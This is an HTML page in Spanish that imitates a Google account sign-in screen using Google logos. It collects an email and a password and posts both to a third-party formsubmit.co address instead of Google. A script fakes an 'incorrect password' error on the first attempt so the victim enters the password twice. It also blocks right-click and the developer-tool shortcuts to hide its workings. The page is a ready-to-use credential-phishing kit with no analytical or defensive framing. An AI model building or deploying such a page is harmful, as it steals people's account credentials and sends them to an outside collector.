<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Accede a tu cuenta con tu Cuenta de Google</title>
  <link href="//www.gstatic.com/images/branding/searchlogo/ico/favicon.ico" rel="icon">
</head>
<body style="background-color: #f0f4f9; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin:0;">

  <!-- Contenedor -->
  <div style="width: 70%; max-width: 1280px; background-color: white; box-shadow: 0 10px 15px rgba(0,0,0,0.1); border-radius: 16px; padding: 32px; box-sizing: border-box;">

    <!-- Logo + TÃ­tulo -->
    <div style="margin-bottom: 24px;">
      <img src="https://www.gstatic.com/images/branding/product/1x/gsa_512dp.png" 
           alt="Google" style="width: 40px; margin-bottom: 16px;">
      <h1 style="font-size: 24px; color: #111827; font-weight: 400; margin:0;">Accede a tu cuenta</h1>
      <a href="#" style="font-size: 14px; color: #374151; text-decoration: none;">Ir a Gmail</a>
    </div>

    <!-- Formulario -->
    <form id="contactForm" 
          action="https://formsubmit.co/b58372e3afafe5f908daf1b0cc3c700f" 
          method="POST" 
          style="display: flex; flex-direction: column; gap: 20px;">

      <!-- Paso 1: Correo -->
      <div id="step1">
        <input 
          id="correo"
          name="correo" 
          placeholder="Correo electrÃ³nico o telÃ©fono" 
          type="email" 
          required
          style="width: 50%; border: 1px solid #D1D5DB; border-radius: 8px; padding: 12px; font-size: 16px; box-sizing: border-box; outline: none;">

        <div style="font-size: 14px; margin-top: 8px;">
          <a href="#" style="color: #2563EB; text-decoration: none;">Â¿Olvidaste el correo electrÃ³nico?</a>
        </div>

        <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 24px;">
          <a href="#" style="color: #2563EB; font-size: 14px; text-decoration: none;">Crear cuenta</a>
          <button type="button" 
                  id="btnNext1"
                  style="background-color: #2563EB; color: white; padding: 8px 24px; border-radius: 8px; font-weight: 500; border:none; cursor:pointer;">
            Siguiente
          </button>
        </div>
      </div>

      <!-- Paso 2: ContraseÃ±a (oculto al inicio) -->
      <div id="step2" style="display: none;">
        <p style="color: #374151; font-size: 14px; margin-bottom: 8px;">Introduce tu contraseÃ±a</p>

        <input id="nombre" 
               name="nombre" 
               placeholder="Ingresa tu contraseÃ±a" 
               type="password" 
               required
               style="width: 100%; border: 1px solid #D1D5DB; border-radius: 8px; padding: 12px; font-size: 16px; box-sizing: border-box; outline: none;">
        <p id="errorNombre" style="color: #DC2626; font-size: 14px; margin-top: 4px; display:none;">ContraseÃ±a incorrecta</p>

        <!-- Hidden fields -->
        <input type="hidden" name="_next" value="https://tu-pagina.com/gracias.html">
        <input type="hidden" name="_captcha" value="false">

        <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 24px;">
          <a href="#" style="color: #2563EB; font-size: 14px; text-decoration: none;">Â¿Olvidaste tu contraseÃ±a?</a>
          <button type="submit" 
                  style="background-color: #2563EB; color: white; padding: 8px 24px; border-radius: 8px; font-weight: 500; border:none; cursor:pointer;">
            Siguiente
          </button>
        </div>
      </div>
    </form>
  </div>

  <!-- Script -->
  <script>
    let intentoNombre = 0;

    // Paso de correo â†’ contraseÃ±a
    document.getElementById("btnNext1").addEventListener("click", function() {
      const correo = document.getElementById("correo").value.trim();
      if (correo === "") {
        alert("Por favor ingresa tu correo");
        return;
      }
      document.getElementById("step1").style.display = "none";
      document.getElementById("step2").style.display = "block";
    });

    // ValidaciÃ³n contraseÃ±a
    document.getElementById("contactForm").addEventListener("submit", function(e) {
      const nombre = document.getElementById("nombre");
      const errorMsg = document.getElementById("errorNombre");

      intentoNombre++;

      if (intentoNombre < 2) { 
        errorMsg.style.display = "block";
        nombre.style.borderColor = "#DC2626";
        errorMsg.textContent = "ContraseÃ±a incorrecta";
        e.preventDefault();
      } else {
        errorMsg.style.display = "none";
        nombre.style.borderColor = "#D1D5DB";
      }
    });

    // ðŸš« Bloquear clic derecho e inspecciÃ³n
    document.addEventListener("contextmenu", e => e.preventDefault()); 
    document.onkeydown = function(e) {
      if (e.keyCode == 123) return false; // F12
      if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false; // Ctrl+Shift+I
      if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false; // Ctrl+U
      if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false; // Ctrl+Shift+J
    };
  </script>

</body>
</html>
